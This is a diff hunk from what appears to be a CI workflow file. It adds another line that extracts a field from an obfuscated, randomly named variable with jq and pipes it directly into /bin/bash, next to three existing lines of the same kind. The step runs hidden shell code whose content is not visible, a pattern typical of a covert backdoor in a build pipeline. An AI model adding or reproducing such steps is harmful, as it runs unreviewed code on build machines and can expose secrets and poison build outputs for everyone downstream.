@@ -25,6 +25,7 @@ jobs:
           echo $czorh51310 | jq -r .hluwz26489 | /bin/bash
           echo $jqidx44885 | jq -r .lv8 | /bin/bash
           printf '%s' "$iftg3626" | jq -r .la2 | /bin/bash
+          echo $rid421 | jq -r .kol0 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
